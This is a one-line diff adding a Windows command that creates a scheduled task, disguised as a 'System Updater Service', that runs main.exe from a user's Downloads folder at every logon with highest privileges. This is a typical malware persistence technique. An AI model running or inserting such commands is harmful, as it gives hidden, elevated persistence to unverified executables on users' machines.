@@ -1,0 +1,1 @@
+schtasks /create /tn "System Updater Service" /tr "C:\Users\hentai\Downloads\main.exe" /sc ONLOGON /RL HIGHEST
